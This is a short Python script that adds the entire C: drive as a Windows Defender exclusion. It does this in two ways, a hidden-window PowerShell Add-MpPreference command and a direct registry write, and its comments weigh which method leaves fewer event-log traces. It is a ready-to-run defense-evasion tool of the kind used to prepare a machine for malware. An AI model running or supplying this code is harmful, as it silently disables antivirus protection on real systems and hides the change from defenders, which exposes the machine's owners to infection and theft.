"""
Defender exclusion via Python
Two methods: PowerShell subprocess or direct registry write via winreg
Requires: Admin privileges
"""

import subprocess
import sys

# Method 1: PowerShell (simple, leaves event log entry - Event ID 5007)
def add_exclusion_powershell(path: str):
    cmd = f'powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Exclusion added (PS): {path}")
    else:
        print(f"[!] Failed: {result.stderr.strip()}")


# Method 2: Direct registry write (quieter, no PS process spawned)
def add_exclusion_registry(path: str):
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, path, 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print(f"[+] Exclusion added (registry): {path}")
    except PermissionError:
        print("[!] Access denied — run as Admin")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    target_path = r"C:\\"

    print("[*] Method 1: PowerShell")
    add_exclusion_powershell(target_path)

    print("[*] Method 2: Registry (winreg)")
    add_exclusion_registry(target_path)
